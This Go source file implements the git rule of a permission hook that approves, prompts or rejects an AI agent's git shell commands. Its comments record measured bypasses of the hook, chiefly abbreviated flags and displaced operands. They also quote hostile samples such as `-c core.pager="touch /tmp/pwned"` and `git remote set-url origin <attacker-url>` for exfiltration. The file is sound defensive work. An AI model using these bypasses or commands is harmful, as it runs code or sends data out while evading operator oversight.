package git

import (
	"os"
	"path/filepath"
	"strings"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmdparse"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/patheval"
)

var readOnlySubcommands = map[string]bool{
	// Porcelain inspection
	"log": true, "diff": true, "status": true, "show": true, "blame": true,
	"describe": true, "shortlog": true, "reflog": true, "grep": true,
	"show-branch": true, "whatchanged": true, "range-diff": true,
	// Plumbing: ref/object inspection
	"for-each-ref": true, "ls-files": true, "ls-remote": true, "ls-tree": true,
	"merge-base": true, "rev-list": true, "rev-parse": true, "show-ref": true,
	"name-rev": true, "cat-file": true, "count-objects": true,
	// Plumbing: diff variants
	"diff-tree": true, "diff-index": true, "diff-files": true,
	// Plumbing: verification/integrity
	"verify-commit": true, "verify-tag": true, "verify-pack": true, "fsck": true,
	// Plumbing: gitignore/gitattributes checks
	"check-ignore": true, "check-attr": true, "check-mailmap": true, "check-ref-format": true,
}

// remoteBlockedSubcommands is the `git remote` subcommand set that MUTATES which
// repository a remote name resolves to, or which of its refs are tracked. Every
// member is a hard Reject — see remoteVerdict for the ruling and the rationale.
//
// The set is exactly the operator's enumeration of 2026-07-30, and it is keyed on
// the VERB only — a verb's own flags (`add -f`, `set-url --add`, `set-url --push`)
// do not need listing, since the verb is what remoteVerdict looks up. `prune` and
// `update` are DELIBERATELY absent: they only refresh LOCAL remote-tracking refs
// from the remote a name already points at, so neither can redirect a push, and
// gating them would change verdicts this bead has no ruling for.
var remoteBlockedSubcommands = map[string]bool{
	"add": true, "remove": true, "rm": true, "rename": true,
	"set-url": true, "set-head": true, "set-branches": true,
}

var modifyingSubcommands = map[string]bool{
	"add": true, "commit": true, "branch": true, "fetch": true,
	"push": true, "stash": true, "config": true, "mu": true,
	"mv": true, "rm": true, "cherry-pick": true, "merge": true,
	"worktree": true,
}

type Rule struct {
	// eval gates a `-C <path>` chdir against path-safety zones. When nil (legacy
	// construction) the `-C` path check is skipped and behavior is unchanged.
	eval *patheval.PathEvaluator
}

func New(eval *patheval.PathEvaluator) *Rule {
	return &Rule{eval: eval}
}

func (r *Rule) Name() string {
	return "git"
}

func (r *Rule) Evaluate(input *hookio.HookInput) hookio.RuleResult {
	if input.ToolName != "Bash" {
		return hookio.RuleResult{Decision: hookio.Abstain, Module: r.Name()}
	}
	cmdStr, err := input.BashCommand()
	if err != nil {
		return hookio.RuleResult{Decision: hookio.Abstain, Module: r.Name()}
	}
	parsed := cmdparse.Parse(cmdStr)
	for _, pc := range parsed {
		if !isGitExecutable(pc.Executable) {
			continue
		}
		// A pre-subcommand -c / --config-env injects arbitrary git config (e.g.
		// -c core.pager="touch /tmp/pwned") that runs on an otherwise read-only
		// subcommand — a known RCE class. Defer to Claude's prompt. Scoped to the
		// pre-subcommand span so `git commit -c <commit>` (a different flag) and
		// `git -C <path>` are NOT falsely abstained.
		if hasGitConfigInjection(pc.Args) {
			return hookio.RuleResult{Decision: hookio.Abstain, Reason: "git: -c/--config-env injects config; deferring to prompt", Module: r.Name()}
		}
		chdirs, subcmd, rest := cmdparse.GitInvocation(pc.Args)
		if subcmd == "" {
			return hookio.RuleResult{Decision: hookio.Abstain, Module: r.Name()}
		}
		res := r.classify(pc, subcmd, rest)
		// A `-C <path>` chdir runs the subcommand against a directory other than
		// the invocation CWD. When the rule would otherwise Approve, demote to
		// Abstain if that directory is unsafe for the subcommand's access class:
		// a read-only subcommand needs the dir to be readable, a modifying one
		// needs it writable. Most-restrictive aggregation then defers to the
		// prompt (Abstain, never a hard Reject — the check uses CanRead/CanWrite,
		// not IsDeny*) instead of auto-approving a write into an unknown zone
		// (pg2-b3eow). Gated to a non-empty -C so a bare git command keeps its
		// verdict regardless of the CWD's zone.
		if res.Decision == hookio.Approve && !r.chdirSafe(input.CWD, chdirs, subcmd) {
			return hookio.RuleResult{
				Decision: hookio.Abstain,
				Reason:   "git: -C target directory is unsafe for a " + subcmd + " (deferred to claude-code)",
				Module:   r.Name(),
			}
		}
		return res
	}
	return hookio.RuleResult{Decision: hookio.Abstain, Module: r.Name()}
}

// classify returns the base verdict for a git subcommand, independent of any
// `-C` path-safety concern (which Evaluate layers on top via chdirSafe).
//
// BARE-INDEX OPERAND SURVEY, 2026-07-30 (pg2-8imjo). Every arm below was checked
// for an operand read by a fixed argument index — the defect class where a leading
// flag displaces the token a gate keys on. Result: NONE REMAIN in this file. The
// `git remote` arm's `rest[0]` was the only one and is now
// cmdparse.FirstOperand(rest) in remoteVerdict; `subcmd` itself comes from
// cmdparse.GitInvocation, which already consumes pre-subcommand options; and every
// other arm keys on a FLAG (hasFlag, cmdparse.HasShortFlag/HasLongFlag) or on a
// classified refspec, never on a position. A NEW arm MUST use FirstOperand rather
// than an index.
//
// `git config` was the second arm of that survey and is now closed the same way
// (pg2-szadj): it was in modifyingSubcommands and approved OUTRIGHT, with no key
// lookup at all, so any key could be written with no prompt. configVerdict below
// locates the key with cmdparse.Operands — the whole-list form of FirstOperand —
// because `--global` and `--type=bool` shift the key's position and a separated
// `-f <file>` shifts it again. See that function for why a position-free scan is
// required rather than a single FirstOperand read.
//
// LONG-FLAG ABBREVIATION SURVEY, 2026-07-30 (pg2-os1kq). The bare-index survey
// above records that every arm keys on a FLAG rather than a position — which moved
// the same defect one axis over. git's parse-options accepts any UNAMBIGUOUS PREFIX
// of a long option, so an EXACT-TOKEN long-flag test is bypassable by shortening the
// flag by one character, and the bypass direction is toward Approve. Measured
// `allow` on a binary built from main @ 9c52f66b: `git reset --har HEAD~1`, `--ha`,
// `--h` (all three PERFORM the hard reset) and `git rebase --interactiv`, `--intera`,
// `--int`, `--in`. Every long-flag test in this file now goes through
// cmdparse.HasLongFlagPrefix or hasAbbrevLongFlag; see hasAbbrevLongFlag for the
// rule that decides which, and flagmatch_test.go for the AST guard that enforces it.
//
// `git branch` FORCE-DELETE was the third arm, folded in by pg2-os1kq's widening of
// 2026-07-30. `isDestructive` tested `a == "-D"` by exact token, which missed the
// clustered shorts `-Df` / `-fD` AND the long-form equivalent `--delete --force` —
// the latter not an abbreviation at all, but `-D` spelled out, which no short-flag
// matching can find. All four measured `allow` while really deleting an unmerged
// branch.
//
// THAT ARM IS NOW SUPERSEDED, AND SO IS `isDestructive` ITSELF (pg2-fkmg4,
// 2026-07-31 operator ruling). `-D` was never the real surface: the force-DELETE
// conjunction left `-M`, `-C` and a bare `-f` approved. `-M` and `-C` were MEASURED
// clobbering an existing branch the caller did not name, and `-f` is git's own
// documented force CREATION, which silently MOVES an existing ref. The ruling replaces
// flag-by-flag classification with git's own safe/unsafe boundary, and the verdict
// LEVEL moves from Ask to Abstain — so the shared "destructive git command" Ask site
// that `isDestructive` fed had exactly one caller left and is gone with it. `git
// branch` now has its own arm below, and isBranchUnsafe holds the whole policy: the
// guarded-vs-unguarded principle, the accepted auto-mode consequence, and the
// `--no-` negation trap.
//
// ONE ADJACENT GAP IS DELIBERATELY LEFT ALONE:
//
//   - `hasGitConfigInjection`'s exact-token `--config-env` / `--git-dir` /
//     `--work-tree` / `--namespace` — those are PRE-SUBCOMMAND options, parsed by
//     git's own `handle_options()` rather than by parse-options, and it accepts NO
//     abbreviation. Measured on git 2.54.0, 2026-07-30: `git --git-di=<dir> log`,
//     `git --git=<dir> log`, `git --work-tre=<dir> log`, `git --namespac=<ns> log`
//     and `git --config-en=X=Y log` each answered `unknown option: …`, while every
//     full spelling worked. So the exact-token test IS git's own parse there, and
//     prefix-matching them would over-match with no bypass to close.
func (r *Rule) classify(pc cmdparse.ParsedCommand, subcmd string, rest []string) hookio.RuleResult {
	// push: the force / remote-ref-destroying spellings (pg2-bohpm) and a NETWORK
	// destination given in place of a remote name (pg2-abb65) are REJECTED — see
	// pushVerdict for both rulings and their rationale. Every other push falls
	// through to the modifying-subcommand Approve below, so ordinary pushes, pushes
	// to a LOCAL PATH, and same-branch --force-with-lease keep their verdict.
	if subcmd == "push" {
		if res, ok := r.pushVerdict(rest); ok {
			return res
		}
	}
	// branch: THE VERDICT IS BY SAFETY, NOT BY FLAG (operator ruling pg2-4yy4r item 5,
	// implemented by pg2-fkmg4). A spelling from which GIT'S OWN GUARD has been removed
	// Abstains; every spelling where that guard still stands keeps its Approve by
	// FALLING THROUGH to modifyingSubcommands["branch"] below. Falling through rather
	// than answering here is deliberate: it is what keeps the redirected-context Ask
	// (`GIT_DIR=/other git branch -d foo`) and the `-C <path>` chdir demotion applying
	// to a safe `git branch` exactly as they did before. See isBranchUnsafe.
	if subcmd == "branch" && isBranchUnsafe(rest) {
		return hookio.RuleResult{
			Decision: hookio.Abstain,
			Reason:   "git: git branch with git's own guard removed (-D/-M/-C, or an explicit -f/--force); deferring to prompt",
			Module:   r.Name(),
		}
	}
	if readOnlySubcommands[subcmd] {
		return hookio.RuleResult{
			Decision: hookio.Approve,
			Reason:   "read-only git command",
			Module:   r.Name(),
		}
	}
	if subcmd == "checkout" {
		if hasRedirectEnvVar(pc) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "git checkout", Module: r.Name()}
	}
	// rebase: approve unless interactive without automated editor.
	//
	// The long flag is matched by PREFIX (pg2-os1kq): the exact-token test missed
	// `--interactiv`, `--intera`, `--inte`, `--int` and `--in`, all measured PARSED
	// by git 2.54.0 on 2026-07-30 (`--i` alone is `ambiguous option: i`), so an
	// interactive rebase could skip the editor requirement and hang on a prompt no
	// one can answer.
	//
	// `-i` STAYS AN EXACT-TOKEN SHORT TEST, deliberately. Widening it to
	// cmdparse.HasShortFlag would scan clusters, and `git rebase` has value-taking
	// shorts whose GLUED value contains `i` (`-Xignore-all-space`), which would
	// manufacture a false editor requirement — the arity problem HasShortFlag
	// documents and pushes to its caller. A clustered `-qi` is therefore still
	// missed; that is a SHORT-flag gap, not this bead's abbreviation class, and
	// closing it needs its own measured ruling.
	if subcmd == "rebase" {
		if hasFlag(rest, "-i") || cmdparse.HasLongFlagPrefix(rest, "interactive") {
			if !hasSequenceEditorEnvVar(pc) {
				return hookio.RuleResult{Decision: hookio.Abstain, Reason: "git rebase -i requires editor", Module: r.Name()}
			}
		}
		if hasRedirectEnvVar(pc) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}
	}
	// filter-branch: approve (history rewriting used by agents for commit cleanup)
	if subcmd == "filter-branch" {
		if hasRedirectEnvVar(pc) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}
	}
	// tag: always reject — tags cause confusion in this workflow
	if subcmd == "tag" {
		return hookio.RuleResult{Decision: hookio.Reject, Reason: "git: git tag is prohibited — tags cause confusion in this workflow", Module: r.Name()}
	}
	// remote: a MUTATION is Reject, a read-only inspection stays Approve — see
	// remoteVerdict for the ruling and the flag-displacement defect it closes.
	if subcmd == "remote" {
		return r.remoteVerdict(rest)
	}
	// config: a WRITE to a key that disables a safety interlock, points git at a
	// program of the caller's choosing, or repoints a remote is gated; a READ and
	// every ordinary write keep their Approve — see configVerdict for the key-by-key
	// ruling and the invariant each verdict rests on.
	if subcmd == "config" {
		return r.configVerdict(pc, rest)
	}
	// modifying: approve (includes tag, mv, rm, worktree, etc.)
	if modifyingSubcommands[subcmd] {
		if hasRedirectEnvVar(pc) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "modifying git command", Module: r.Name()}
	}
	// reset: approve unless --hard, IN ANY SPELLING GIT ACCEPTS.
	//
	// THIS WAS THE SEVERE HALF OF pg2-os1kq. The test was an exact-token
	// `hasFlag(rest, "--hard")`, so `--har`, `--ha` and `--h` — measured on git
	// 2.54.0, 2026-07-30, to each PERFORM the hard reset — fell through to the
	// Approve below, whose reason ASSERTS the reset is soft. A hard reset was not
	// merely approved: it was approved with a message telling every later reader of
	// the log that the working tree was safe. cmdparse.HasLongFlagPrefix matches
	// every abbreviation without an enumeration to keep in step with git; its doc
	// records why over-matching is the fail-safe direction here.
	if subcmd == "reset" {
		if cmdparse.HasLongFlagPrefix(rest, "hard") {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git:destructive: git reset --hard is destructive", Module: r.Name()}
		}
		if hasRedirectEnvVar(pc) {
			return hookio.RuleResult{Decision: hookio.Ask, Reason: "git command with redirected context", Module: r.Name()}
		}
		return hookio.RuleResult{Decision: hookio.Approve, Reason: "git:modifying: git reset (soft) is safe", Module: r.Name()}
	}
	// clean: a DECISIVE Ask in every spelling, and it MUST STAY decisive.
	//
	// WHAT THE OPERATOR IS ANSWERING, written down here because its absence was half
	// of pg2-szadj: this prompt is worth answering only while `clean.requireForce`
	// is TRUE — git's default, and the invariant that makes git refuse to delete
	// untracked files without an explicit force flag. A prior `git config
	// clean.requireForce false` removes that refusal and leaves this prompt
	// unchanged, so the operator would be answering under a belief that is no longer
	// true. configVerdict gates that write for exactly this reason; the two are one
	// control and neither is sufficient alone.
	//
	// NO FLAG-AWARE RE-CLASSIFICATION HERE, deliberately (reviewed and rejected,
	// 2026-07-30): the clustered form `-fdx` is a SINGLE token, so an exact-token
	// `-f` test would sort the most destructive spelling into the "no force given"
	// branch and approve it. Splitting this Ask by flag needs cmdparse.HasShortFlag
	// and a ruling of its own; until then the unconditional Ask is the correct
	// verdict for every spelling.
	if subcmd == "clean" {
		return hookio.RuleResult{Decision: hookio.Ask, Reason: "git:destructive: git clean is destructive", Module: r.Name()}
	}
	return hookio.RuleResult{Decision: hookio.Abstain, Module: r.Name()}
}

// remoteVerdict returns the verdict for a `git remote` — rest being the args AFTER
// the `remote` subcommand. Unlike pushVerdict it always answers, because every
// `git remote` is either a mutation (Reject) or an inspection (Approve).
//
// THE SUBCOMMAND IS LOCATED WITH cmdparse.FirstOperand, NOT rest[0], AND THAT IS
// THE WHOLE BUG THIS CLOSES (pg2-8imjo). `rest[0]` is the first TOKEN, so any
// leading flag displaced the subcommand out of remoteBlockedSubcommands and the
// arm fell through to the read-only Approve below. Measured on a binary built from
// main @ b497d6f6, 2026-07-30: `git remote -v add upstream
// https://example.invalid/x.git` answered `allow` — rest[0] was `-v`. Every
// mutating verb had this bypass in both flag spellings (`-v`, `--verbose`).
// FirstOperand skips leading flags and `=`-glued values, and DELIBERATELY does not
// skip SEPARATED values, which is exactly what this call site needs: its doc
// comment pins this very case (`["-v","add","upstream",url]` → `add`), because a
// value-skipping walk would consume `add` as -v's value and answer `upstream`.
// A regression here MUST NOT be fixed by reintroducing an index — re-read that
// helper's doc first.
//
// WHY REJECT AND NOT ASK. Operator ruling, 2026-07-30: a `git remote` mutation
// must be a hard Reject; the operator would rather run those by hand. The
// rationale is EXFILTRATION — a remote mutation silently redirects where pushes
// land, so `git remote set-url origin <attacker-url>` turns every later, entirely
// ordinary-looking `git push origin main` into a send to another host, with
// nothing at the push site to show for it. An Ask cannot implement that ruling
// twice over: it asks a person a question the ruling has already answered, and
// before this change the Ask covered only the BARE spelling while every
// flag-displaced spelling of the SAME mutation was approved outright — which
// teaches its own bypass, the pattern the force-push Rejects (pushVerdict) exist
// to stop. Reject leaves no approvable spelling.
//
// IT IS ALSO THE CONTROL pg2-abb65 MIRRORS. `git push` to a network URL is a
// Reject whose recorded reasoning is that it is the SAME exfiltration vector with
// fewer steps, and must therefore be at least as strict as the `git remote
// set-url` gate. An Ask here would invert that relationship — the fast door
// refused, the slow one prompted — so this Reject is what makes that sibling's
// reasoning true. The two MUST be changed together or not at all.
//
// WHAT WOULD JUSTIFY CHANGING IT: a new operator ruling. Needing one remote added
// is not one — the operator runs it by hand, which is the remedy the ruling names.
//
// FALSE-POSITIVE COST IS ZERO, measured 2026-07-30: the only in-tree callers of
// `git remote add` are a `pn` workspace smoke script and two pg-pr Go tests, all of
// which run the command INSIDE a test binary or a shell script, where the hook
// never sees the inner command. The Reject reaches only an agent typing `git
// remote …` as a Bash tool call, which is the intent.
//
// READ-ONLY `git remote` STAYS APPROVE: bare `git remote`, `-v`/`--verbose`,
// `show`, `get-url`. `prune` and `update` also stay approvable — see
// remoteBlockedSubcommands for why they are not mutations in the sense that
// matters here.
//
// TEXT VS PARSED: the test reads PARSED tokens (post-unquote
// cmdparse.ParsedCommand.Args) and the rule runs only when
// isGitExecutable(pc.Executable), so `git remote set-url …` quoted in a commit
// message or a `bd comment` body is TEXT and never matches. That is the pg2-5b901
// failure mode; do not reintroduce a strings.Contains over command text.
func (r *Rule) remoteVerdict(rest []string) hookio.RuleResult {
	remoteSub, _ := cmdparse.FirstOperand(rest)
	if remoteBlockedSubcommands[remoteSub] {
		return hookio.RuleResult{
			Decision: hookio.Reject,
			Reason: "git: mutating a remote is prohibited — `git remote " + remoteSub +
				"` changes where pushes land, an exfiltration vector, so it is refused rather than prompted (operator ruling 2026-07-30). " +
				"Every spelling is refused, including a flag-displaced one such as `git remote -v " + remoteSub +
				"`, so retrying with another will not work. Ask the operator to run it by hand",
			Module: r.Name(),
		}
	}
	return hookio.RuleResult{Decision: hookio.Approve, Reason: "read-only git remote", Module: r.Name()}
}

// configGateClass is the MECHANISM by which a gated `git config` key is
// dangerous. The verdict is derived from the CLASS rather than stored per key, so
// two keys that fail the same way cannot drift to different answers, and adding a
// key is a one-line decision about which mechanism it is.
type configGateClass int

const (
	// configSink — git EXECUTES the value, or a program found under the path it
	// names, during an ordinary git operation.
	configSink configGateClass = iota + 1
	// configInterlock — the value DISABLES a refusal git makes by default, so a
	// later command that looks unchanged stops refusing what it used to.
	configInterlock
	// configRedirect — the value REPOINTS a remote at another host, so a later,
	// entirely ordinary `git push origin main` sends elsewhere.
	configRedirect
)

// gatedConfigKeys is the `git config` key set whose WRITE is gated, keyed on
// `<section>.<name>` lowercased with any middle subsection dropped — the identity
// configKeyID computes, and the reason one entry covers both `http.sslVerify` and
// `http.https://host/.sslVerify`.
//
// THE SURVEY (pg2-szadj, 2026-07-30). Every key the bead enumerated was weighed by
// MECHANISM, and the verdict follows the mechanism:
//
//	KEY                        MECHANISM  VERDICT  RATIONALE
//	clean.requireForce         interlock  Ask      git's refusal to delete untracked files without an explicit force flag. `false` removes it AND leaves the `git clean` prompt unchanged, so the operator answers under a belief that is no longer true — the defect this bead names.
//	core.hooksPath             sink       Ask      points hook execution at a caller-chosen directory: arbitrary code on the NEXT git operation, whatever that operation is.
//	core.pager                 sink       Ask      git spawns the value on nearly every read command; it is the same sink the pre-subcommand `-c core.pager=…` guard already defers.
//	core.fsmonitor             sink       Ask      the value MAY be a hook program git runs on every index refresh. Over-approximate: the harmless `true`/`false` spelling is gated too (see the OVER-APPROXIMATIONS note).
//	core.sshCommand            sink       Ask      replaces the ssh binary for every fetch and push.
//	diff.<driver>.textconv     sink       Ask      the enumerated `*.textconv`: git runs it to render a blob, selected by .gitattributes rather than by the command line.
//	diff.external              sink       Ask      replaces the diff program for every `git diff`.
//	receive.denyCurrentBranch  interlock  Ask      git's refusal to let a push update the branch checked out in a non-bare repo. `false`/`updateInstead` lets a push rewrite a live worktree's HEAD.
//	http.sslVerify             interlock  Ask      certificate verification for every https fetch/push. `false` makes an interception invisible.
//	url.<base>.insteadOf       redirect   REJECT   rewrites every matching URL, so `git push origin main` goes to another host with NO `git remote` change to show for it.
//
// NONE OF THE TEN IS LEFT APPROVED: each is either a program git executes or a
// refusal git makes, and the bead pre-authorized the ruling.
//
// WHY THE INTERLOCK AND SINK CLASSES ARE ASK, NOT REJECT — the weaker verdict is
// the CONSISTENT one. The identical vector by the other route, a pre-subcommand
// `git -c core.pager=EVIL log`, is already handled by hasGitConfigInjection as an
// ABSTAIN that defers to Claude's prompt. A decisive Ask is strictly stricter than
// that Abstain, so this gate sits at or above the control it mirrors, which is the
// relative-stringency test pushVerdict's network-URL Reject was argued from. Going
// further to Reject would make the porcelain route stricter than the injection
// route for the SAME sink, an inversion with no operator ruling behind it — and
// unlike force-push or `git remote`, no ruling exists here. An Ask is also what
// actually REPAIRS this defect: the harm is that the operator answers a later
// prompt under a stale belief, and a prompt AT THE MOMENT THE BELIEF CHANGES is
// exactly the remedy. Raising either class to Reject needs an operator ruling.
//
// WHY THE REDIRECT CLASS IS REJECT — relative stringency in the other direction.
// `git remote set-url` is a hard Reject (remoteVerdict, operator ruling
// 2026-07-30) precisely because it silently redirects where pushes land, and
// pushing straight to a URL is a Reject (pushVerdict) so that it cannot be the
// cheaper way around that gate. `git config remote.origin.url <url>` IS `git
// remote set-url`, by another porcelain and the same one config write; and
// `url.<base>.insteadOf` is strictly worse, since it leaves the remote's own URL
// looking correct. An Ask on any of them would reopen the door remoteVerdict
// closed. The three must be changed together with remoteVerdict or not at all.
//
// ANTI-BYPASS SIBLINGS ARE INCLUDED, because gating a key while the SAME mechanism
// stays reachable one word away teaches the bypass instead of closing it — the
// pattern remoteVerdict and pushVerdict were both written to stop:
//
//   - `pager.<cmd>` (whole section, see gatedConfigSections) — per-command pager;
//     `pager.log` is core.pager for one command.
//   - `core.editor`, `sequence.editor` — programs git spawns on commit/tag and on
//     `rebase -i`; core.pager's immediate siblings.
//   - `diff.<driver>.command`, `merge.<driver>.driver`,
//     `filter.<driver>.clean|smudge|process` — the rest of the .gitattributes
//     driver family that `diff.<driver>.textconv` belongs to; each runs a program
//     on checkout, add, diff or merge.
//   - `credential.helper` — a program git runs, and one handed credentials.
//   - `init.templateDir` — plants hooks into every repo a later `git init`/`git
//     clone` creates; core.hooksPath for repos that do not exist yet.
//   - `include.path`, `includeIf.<cond>.path` — makes git READ CONFIG from a
//     caller-chosen file, which can then set any key in this table. Gating the
//     table while leaving this open would make the whole table one indirection
//     deep.
//   - `url.<base>.pushInsteadOf` — the push-only twin of insteadOf.
//   - `remote.<name>.url`, `remote.<name>.pushurl` — the config spelling of `git
//     remote set-url`, which remoteVerdict already Rejects.
//
// SURVEYED AND DELIBERATELY LEFT APPROVED:
//
//   - Ordinary configuration — `user.*`, `commit.gpgsign`, `branch.<n>.remote`,
//     `push.default`, `pull.rebase`, `core.autocrlf`, `color.*`, `fetch.prune`,
//     `init.defaultBranch`, `rerere.*` and the rest. None carries a mechanism, and
//     a blanket gate on `git config` WRITES is explicitly the wrong answer here: it
//     is a large false-positive surface over the routine traffic this rule exists
//     to keep flowing.
//   - `alias.<name>` — an alias whose value begins with `!` IS a shell command, but
//     it only runs when someone LATER invokes `git <alias>`, and at that point this
//     rule sees a git subcommand in no set and Abstains, deferring to the prompt.
//     So the sink is already prompted at use time; gating the definition as well
//     needs a ruling, not an inference.
//   - `remote.<n>.uploadpack`/`receivepack`, `uploadpack.packObjectsHook`,
//     `core.gitProxy`, `protocol.*.allow` — genuine sinks and loosenings, but on a
//     server-side or alternate-transport path this workflow does not use. Named here
//     so a later reader adds them under one ruling instead of rediscovering them.
//   - `safe.directory`, `core.fileMode`, `core.symlinks` — they relax a check, but
//     execute nothing and redirect nothing.
//
// OVER-APPROXIMATIONS, all in the safe direction and all deliberate:
//
//  1. THE GATE DOES NOT MODEL THE DIRECTION OF THE CHANGE. `git config --unset
//     clean.requireForce` RESTORES the default and is harmless, yet it is gated.
//     Deciding direction means reading the key's VALUE, and configElideFlagValues
//     deliberately stops short of that: it knows which flags take an ARGUMENT, not
//     which operand is the value — that additionally requires knowing the
//     subcommand shape (`<key> <value>` vs `set <key> <value>` vs `--unset <key>`),
//     which is a second table for a verdict that would not change. The cost is one
//     prompt on a rare restore-to-default; the benefit is that no `--unset`-shaped
//     spelling is an approvable route to a gated key. Direction is not even
//     uniform: for a key whose safe state is SET, unsetting is the dangerous half.
//  2. `core.fsmonitor true` is gated although it names no program.
//  3. An operand that merely SPELLS a gated key is gated even in value position
//     (`git config alias.x diff.external`). Absurd input, and gating it is the safe
//     reading of an ambiguity that distinguishing key from value would be needed to
//     resolve — see 1.
var gatedConfigKeys = map[string]configGateClass{
	// Execution sinks — git runs the value, or something under it.
	"core.hookspath":    configSink,
	"core.pager":        configSink,
	"core.editor":       configSink,
	"sequence.editor":   configSink,
	"core.sshcommand":   configSink,
	"core.fsmonitor":    configSink,
	"diff.external":     configSink,
	"diff.textconv":     configSink, // diff.<driver>.textconv
	"diff.command":      configSink, // diff.<driver>.command
	"merge.driver":      configSink, // merge.<driver>.driver
	"filter.clean":      configSink, // filter.<driver>.clean
	"filter.smudge":     configSink, // filter.<driver>.smudge
	"filter.process":    configSink, // filter.<driver>.process
	"credential.helper": configSink, // also credential.<url>.helper
	"init.templatedir":  configSink,
	"include.path":      configSink,
	"includeif.path":    configSink, // includeIf.<condition>.path

	// Disabled safety interlocks — a refusal git makes by default.
	"clean.requireforce":        configInterlock,
	"http.sslverify":            configInterlock, // also http.<url>.sslVerify
	"receive.denycurrentbranch": configInterlock,

	// Silent redirects — where fetches and pushes actually go.
	"url.insteadof":     configRedirect, // url.<base>.insteadOf
	"url.pushinsteadof": configRedirect, // url.<base>.pushInsteadOf
	"remote.url":        configRedirect, // remote.<name>.url
	"remote.pushurl":    configRedirect, // remote.<name>.pushurl
}

// gatedConfigSections gates an ENTIRE section, for the one mechanism where every
// variable in the section is the same sink: `pager.<cmd>` sets the pager for one
// git command, so gating `core.pager` alone would leave `pager.log` as a one-word
// bypass of it.
var gatedConfigSections = map[string]configGateClass{
	"pager": configSink,
}

// Long-flag ABBREVIATION MINIMUMS for the `git config` options configVerdict keys
// on. Same mechanism as minAbbrevRepo, the one remaining `git push` minimum —
// git's parse-options accepts any UNAMBIGUOUS PREFIX, so matching one exact
// spelling misses real ones — but the minimums are NOT shared with it: what a prefix
// collides with depends on which option table git parsed the command against.
//
// THESE MINIMUMS MUST STAY MEASURED, and MUST NOT be replaced by
// cmdparse.HasLongFlagPrefix the way the `git push` boolean gates were (pg2-os1kq).
// A `git config` option match is not a bare dangerous-flag boolean: it ELIDES a
// token (configElideFlagValues) or flips the write indication, so it shifts the
// operand count that configIsRead's read/write bound and gatedConfigKey's key scan
// both rest on. Over-matching there has no safe direction — it could drop a real
// operand and change a `git config` verdict. See hasAbbrevLongFlag for the rule.
//
// Each value is the SHORTEST prefix real git accepted, MEASURED against git 2.54.0
// on 2026-07-30 by running the flag and reading back the config; one character
// shorter, git answered `error: ambiguous option`. Re-measure before changing one.
//
// ONLY WRITE-INDICATING options are listed, because those are the only spellings
// that can change an answer (see configIsRead). `--global`, `--local`, `--system`
// and `--type` need no entry: they are neither read nor write indicators, and the
// operand scan skips flags whatever they spell. Measured anyway, for a later
// reader: their minimums are `--gl`, `--lo`, `--sy` and `--t`, while `--g`, `--l`
// and `--s` are all ambiguous (`--g` with --get-color/--get-colorbool, `--l` with
// --local/--list, `--s` with --show-scope/--show-names).
const (
	minAbbrevUnset          = len("unset")  // exact only: `--unse` is ambiguous with --unset-all
	minAbbrevUnsetAll       = len("unset-") // one shorter is `--unset`, which IS a different option
	minAbbrevReplaceAll     = len("rep")    // `--re` is ambiguous: --rename-section / --remove-section
	minAbbrevAdd            = len("a")      // no other legacy `git config` option starts with a
	minAbbrevRemoveSection  = len("rem")    // `--re` as above
	minAbbrevRenameSection  = len("ren")    // `--re` as above
	minAbbrevConfigEditFlag = len("ed")     // `--e` is ambiguous: --edit / --expiry-date
)

// configWriteFlags maps each `git config` long option that MAKES THE INVOCATION A
// WRITE to its measured abbreviation minimum. Order of iteration does not matter —
// the caller only needs to know whether any is present.
var configWriteFlags = map[string]int{
	"unset":          minAbbrevUnset,
	"unset-all":      minAbbrevUnsetAll,
	"replace-all":    minAbbrevReplaceAll,
	"add":            minAbbrevAdd,
	"remove-section": minAbbrevRemoveSection,
	"rename-section": minAbbrevRenameSection,
	"edit":           minAbbrevConfigEditFlag,
}

// configValueFlags maps each `git config` long option that CONSUMES THE NEXT TOKEN
// as its argument to that option's measured abbreviation minimum, and
// configValueShortFlags is the same set's short spellings.
//
// MEASURED, not read off the usage text, against git 2.54.0 on 2026-07-30. The
// probe is decisive: with `foo.bar` set to a sentinel, `git config <flag> zzz
// foo.bar` prints the sentinel when <flag> CONSUMED `zzz` (so `foo.bar` is the key)
// and answers `error: key does not contain a section: zzz` when it did not. By that
// probe `--file`/`-f`, `--blob`, `--type`/`-t`, `--default`, `--comment`, `--value`
// and `--url` consume; `--fixed-value`, `--includes`, `--name-only`,
// `--show-origin`, `--regexp`, `--all`, `--bool`, `--int`, `--path`,
// `--expiry-date`, `-z` and `--null` do NOT. `--value` and `--url` are rejected as
// `unknown option` in the legacy positional mode and exist only under the git 2.54
// subcommands; they are listed because configElideFlagValues cannot tell the two
// modes apart and the entry is harmless in the mode that rejects the flag outright.
//
// THE MINIMUMS ARE ALSO GIT'S DISAMBIGUATION POINTS, which is why no BOOLEAN option
// can be mistaken for one of these: `--fil` because `--fi` is ambiguous with
// --fixed-value; `--bl` because `--b` is ambiguous with --bool-or-int/--bool-or-str;
// `--t`, `--d`, `--c`, `--v`, `--u` because no other option of that mode starts with
// those letters. Checked against every boolean listed above — none of their names
// prefix-matches an entry here at or above its minimum.
//
// GETTING AN ENTRY WRONG IS THE UNSAFE DIRECTION, so both halves of the list matter.
// A MISSING entry over-counts operands, which can only push an invocation INTO the
// gate (a false prompt). A SPURIOUS entry would elide a token that is really an
// operand, and could therefore drop the KEY out of the scan — which is why every
// entry above was measured rather than inferred, and why a new one MUST be.
var configValueFlags = map[string]int{
	"file":    len("fil"),
	"blob":    len("bl"),
	"type":    len("t"),
	"default": len("d"),
	"comment": len("c"),
	"value":   len("v"),
	"url":     len("u"),
}

